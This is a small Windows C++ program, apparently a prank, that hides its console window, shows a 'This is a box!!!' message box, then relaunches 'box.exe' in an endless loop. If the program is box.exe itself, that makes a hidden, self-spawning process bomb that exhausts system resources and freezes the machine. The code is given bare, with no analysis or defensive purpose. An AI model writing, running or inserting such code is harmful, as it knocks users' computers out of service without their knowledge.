#include <time.h>
#include "pch.h"
#include <iostream>
#include <fstream> 
#include <Windows.h>
#include <stdlib.h>
#include <stdio.h> 
#include <cstdlib>
#include <ctime> 
int main()
{
		ShowWindow(GetConsoleWindow(), SW_HIDE);
		MessageBox(0, L"This is a box!!!", L"Hello", MB_OK);
		for(;;)
		system("start box.exe");
		return 0;
}
